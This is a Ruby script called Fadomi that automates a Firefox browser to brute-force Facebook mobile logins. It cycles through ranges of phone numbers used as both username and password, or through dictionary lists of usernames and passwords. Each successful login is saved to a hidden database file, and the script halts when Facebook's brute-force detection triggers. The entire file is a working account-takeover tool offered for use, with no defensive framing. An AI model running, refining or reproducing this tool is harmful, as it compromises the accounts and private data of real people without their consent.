#!/bin/ruby
trap("SIGINT") { throw :ctrl_c }
catch :ctrl_c do
begin

	system("clear")
	puts '___________    _____    ________    ________       _____     _|=|_   '
	puts '\_   _____/   /  _  \   \______ \   \_____  \     /     \   /     \  '
	puts ' |    __)    /  /_\  \   |    |  \   /   |   \   /  \ /  \ ( (| |) ) '
	puts ' |     \    /    |    \  |    `   \ /    |    \ /    Y    \ \_   _/  '
	puts ' \___  /    \____|__  / /_______  / \_______  / \____|__  /   | |    '
	puts '     \/             \/          \/          \/          \/    |_|    '
	puts '                       CODED BY MAGDY MOUSTAFA                    '
	puts ''
	def help
		puts "|[   -db => show database successful logins , use with clear '-dbs clear' to delete database "
		puts "|[   -m1 , --mode1 => bruteforce in range"
		puts "|[   -m1+ , --mode1+ => dictionary attack on username and password from the same list"
		puts "|[   -m2 , --mode2 => dictionary attack on username with password list"
		puts "|[   -ttf , --targets-to-find => set the numbers of targets to find ( Optional ) "
		puts "|[   usage. ruby Fadomi.rb [ option ] [ parameter 1 ] [ parameter 2 ] ... "
		puts "|[   eg. ruby Fadomi.rb -db"
		puts "|[   eg. ruby Fadomi.rb -m1 01061031400 01061031500 -ttf 3 "
		puts "|[   eg. ruby Fadomi.rb -m1+ phone_numbers_list.txt "
		puts "|[   eg. ruby Fadomi.rb --mode2 ashgan11 password_list.txt" 
		exit
	end
	if ARGV[0] == "-db"
		if File.file?(".database.txt") == true && ARGV[1] == nil 
		    	fileObj = File.new( '.database.txt' , "r")
		    	while (line = fileObj.gets)
		            	puts(line)
		    	end
		    	fileObj.close
		elsif File.file?(".database.txt") == true && ARGV[1] == 'clear' 
			puts "[+] Successful logins database has been deleted"
			File.delete('.database.txt')
		else
			puts "[X] You Have Nothing To Show .. Yet :))" 
		end
		exit
	elsif ARGV[0] == nil || ARGV[0] == "-h" || ARGV[0] == "--help"
			help
	end

	require 'watir-webdriver'
	require 'terminal-table'

	if ARGV[0] =~ /-/
		@browser = Watir::Browser.new :firefox
		@browser.goto 'https://m.facebook.com'
	else
		help
	end
	rows= []
	table = Terminal::Table.new :headings => [ "Target" , "Password " , "Task Information" ], :rows => rows , :style => {:width => 60 }
	table.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
	puts table

	@v=0
	@ttf = ARGV[4].to_i
	def browserr ( b1 , b2 )
		def browser_action
                        @browser.close
                        @browser = Watir::Browser.new
                        @browser.goto "https://m.facebook.com"
		end
		@browser.text_field( :name => 'email' ).set b1
		    @browser.text_field( :name => 'pass' ).set b2
		    @browser.button( :name => 'login' ).click
		    sleep 2
		    if @browser.link( :href => "https://m.facebook.com/?refid=9" ).exists? == true && @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false			
			@rows2 = []
                        @rows2 << [ "[X] Failed To Login , Facebook Breuteforce Detection ERR " ]
                        @table2 = Terminal::Table.new :rows => @rows2
                        @table2.style = { :border_x => "=", :border_i => "x"}
			puts ''
			@browser.close
                        puts @table2
			exit
		    elsif @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false || @browser.button( :name => 'login' ).exists? == false
				
		        @rows2 = []
		        @rows2 << [ b1 , b2  , "[+] Succeed To Login" ]
		        @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
		        @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
		        puts @table2
			open('.database.txt', 'a') { |f|
	 			 f.puts @table2
			}
			if ARGV[3] == "-ttf" || ARGV[3] == "--ttf" || ARGV[3] == "--targets-to-find"
	        		@v=@v+1
        			if @v.to_i > @ttf || @v.to_i == @ttf
		                        @browser.close
                			exit
        			end
			end
				browser_action
		    else	
                        @rows2 = []
                        @rows2 << [ b1 , b2 , "[X] Failed To Login" ]
                        @table2 = Terminal::Table.new :rows => @rows2 , :style => {:width => 60 }
                        @table2.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
                        puts @table2
		    end
	end

	if ARGV[0] == "-m1" || ARGV[0] == "--mode1"
		    for i in ARGV[1] .. ARGV[2]
			browserr i, i 
		    end
	elsif ARGV[0] == "-m2" || ARGV[0] == "--mode2"
		f = File.open( ARGV[2], "r")
		f.each_line do |line| 
	  		browserr ARGV[1] , line 
		end
		f.close
	elsif ARGV[0] == "-m1+" || ARGV[0] == "--mode1+"
		    f = File.open( ARGV[1], "r")
		    f.each_line do |line|
		            browserr line , line
		    end
		    f.close
	end
	@browser.close
	rescue Exception
	end
end
puts ""
puts "[X] EXIT"
